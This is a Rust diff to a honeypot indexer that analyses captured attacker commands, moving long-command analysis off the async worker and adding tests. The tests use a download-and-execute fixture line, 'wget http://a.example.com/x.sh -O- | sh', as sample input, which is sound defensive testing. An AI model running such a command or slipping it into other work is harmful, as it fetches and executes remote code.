@@ -378,6 +378,44 @@ fn command_of(metadata: &Value) -> Option<&str> {
         .or_else(|| metadata.get("command").and_then(Value::as_str))
 }
 
+/// What the indexer derives from one command line, all of it a pure function of the text.
+#[derive(Debug, PartialEq, Eq)]
+struct CommandFacts {
+    /// The line's fingerprint shape.
+    shape: String,
+    /// The indicators the line carries.
+    found: Vec<Indicator>,
+    /// The ATT&CK tags of the line read as shell; empty for a sensor that does not speak shell.
+    shell_hits: Vec<Match>,
+}
+
+/// A command up to this long is analysed in place. Sensors cap a command at 1 KiB, where the three
+/// passes cost about 0.4 ms together; the cost grows with the text (about 16 ms at 64 KiB and 60 ms
+/// at 1 MiB, the ledger's line limit), so a longer line is analysed off the async worker.
+const INLINE_COMMAND_BYTES: usize = 16 * 1024;
+
+fn command_facts(command: &str, shell: bool) -> CommandFacts {
+    CommandFacts {
+        shape: fingerprint::normalize(command),
+        found: ioc::extract_from_command(command),
+        shell_hits: if shell {
+            attack::tag_command(command)
+        } else {
+            Vec::new()
+        },
+    }
+}
+
+/// [`command_facts`], off the async worker when the line is long enough to hold it for
+/// milliseconds (`core_scoring::off_worker`).
+fn command_facts_for(command: &str, shell: bool) -> CommandFacts {
+    if command.len() <= INLINE_COMMAND_BYTES {
+        command_facts(command, shell)
+    } else {
+        core_scoring::off_worker(|| command_facts(command, shell))
+    }
+}
+
 /// The most XOR-encoded lines a representative keeps.
 const MAX_ENCODED_LINES: usize = 8;
 
@@ -629,15 +667,20 @@ impl Batch {
         match event.signal.as_str() {
             "honeypot_command_exec" => {
                 if let Some(command) = command_of(&event.metadata) {
-                    self.command(tx, event, command).await?;
-                    let found = ioc::extract_from_command(command);
+                    let shell = attack::is_shell_sensor(&event.sensor);
+                    let CommandFacts {
+                        shape,
+                        found,
+                        shell_hits,
+                    } = command_facts_for(command, shell);
+                    self.command(tx, event, &shape).await?;
                     if !self.replay {
                         self.record_iocs(tx, event, &found).await?;
                     }
                     // Protocol commands (an SMTP DATA, a Redis CONFIG) share this event shape and
                     // are not shell lines; the database sensors' have rules of their own.
-                    if attack::is_shell_sensor(&event.sensor) {
-                        let mut hits = attack::tag_command(command);
+                    if shell {
+                        let mut hits = shell_hits;
                         hits.extend(attack::tag_indicators(&found));
                         self.tag(tx, event, hits).await?;
                     } else {
@@ -845,17 +888,16 @@ impl Batch {
         &mut self,
         tx: &mut Transaction<'_, Postgres>,
         event: &EventRow,
-        command: &str,
+        shape: &str,
     ) -> Result<(), sqlx::Error> {
         let Some(session_id) = event.session_id.as_deref() else {
             return Ok(());
         };
-        let shape = fingerprint::normalize(command);
         if shape.is_empty() {
             return Ok(());
         }
         let session = match self.session(tx, session_id).await? {
-            None => Session::start(event, 0, &shape),
+            None => Session::start(event, 0, shape),
             Some(mut s) => {
                 // The session's own gap, not its sensor's clock: several nodes can feed one sensor
                 // name with different lags, and a lagging node's session must not be cut into
@@ -865,12 +907,12 @@ impl Batch {
                     self.close_run(session_id, &mut s);
                 }
                 if s.closed {
-                    Session::start(event, s.run + 1, &shape)
+                    Session::start(event, s.run + 1, shape)
                 } else {
                     s.last_seen = s.last_seen.max(event.observed_at);
                     s.last_event_id = event.id;
                     if s.campaign_key.is_none() {
-                        s.digest.fold(&shape);
+                        s.digest.fold(shape);
                         if s.digest.shapes >= MAX_RUN_SHAPES {
                             self.materialize(session_id, &mut s);
                         }
@@ -2003,5 +2045,84 @@ mod tests {
         assert!(is_sha256_hex(&"a".repeat(64)));
         assert!(!is_sha256_hex(&"A".repeat(64)));
         assert!(!is_sha256_hex("abc"));
+    }
+
+    /// A line past the inline limit, dense enough in words that every pass has work to do.
+    fn long_command() -> String {
+        "cd /tmp; wget http://a.example.com/x.sh -O- | sh; echo hello world; ".repeat(1 << 14)
+    }
+
+    #[test]
+    fn a_long_command_yields_the_same_facts_wherever_it_is_analysed() {
+        let command = long_command();
+        assert!(command.len() > INLINE_COMMAND_BYTES);
+        for shell in [true, false] {
+            assert_eq!(
+                command_facts_for(&command, shell),
+                command_facts(&command, shell)
+            );
+        }
+        // A short line takes the in-place path and still agrees with itself.
+        let short = "cd /tmp; wget http://a.example.com/x.sh -O- | sh";
+        assert_eq!(command_facts_for(short, true), command_facts(short, true));
+        assert!(!command_facts(short, true).shell_hits.is_empty());
+        assert!(command_facts(short, false).shell_hits.is_empty());
+    }
+
+    /// The longest gap between polls of a 5 ms ticker over `step`, on a one-worker runtime, so the
+    /// step can only leave the ticker running by getting off the worker.
+    async fn longest_ticker_gap(step: impl FnOnce() + Send + 'static) -> std::time::Duration {
+        use std::sync::Arc;
+        use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
+        use std::time::{Duration, Instant};
+        let worst_us = Arc::new(AtomicU64::new(0));
+        let stop = Arc::new(AtomicBool::new(false));
+        let ticker = tokio::spawn({
+            let (worst_us, stop) = (worst_us.clone(), stop.clone());
+            async move {
+                let mut last = Instant::now();
+                while !stop.load(Ordering::Relaxed) {
+                    tokio::time::sleep(Duration::from_millis(5)).await;
+                    let now = Instant::now();
+                    worst_us.fetch_max((now - last).as_micros() as u64, Ordering::Relaxed);
+                    last = now;
+                }
+            }
+        });
+        tokio::time::sleep(Duration::from_millis(50)).await;
+        tokio::spawn(async move { step() }).await.unwrap();
+        tokio::time::sleep(Duration::from_millis(50)).await;
+        stop.store(true, Ordering::Relaxed);
+        ticker.await.unwrap();
+        Duration::from_micros(worst_us.load(Ordering::Relaxed))
+    }
+
+    /// The indexer analyses a command inside an async task, so a long one must not hold the
+    /// runtime's worker for the whole analysis (60 ms at 1 MiB in a release build).
+    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
+    async fn analysing_a_long_command_leaves_the_runtime_responsive() {
+        let command = std::sync::Arc::new(long_command());
+        let in_place = longest_ticker_gap({
+            let command = command.clone();
+            move || {
+                command_facts(&command, true);
+            }
+        })
+        .await;
+        let routed = longest_ticker_gap({
+            let command = command.clone();
+            move || {
+                command_facts_for(&command, true);
+            }
+        })
+        .await;
+        assert!(
+            in_place >= std::time::Duration::from_millis(60),
+            "control: analysing in place should starve the ticker, gap {in_place:?}"
+        );
+        assert!(
+            routed < in_place / 2 && routed < std::time::Duration::from_millis(100),
+            "routed gap {routed:?} against in-place gap {in_place:?}"
+        );
     }
 }
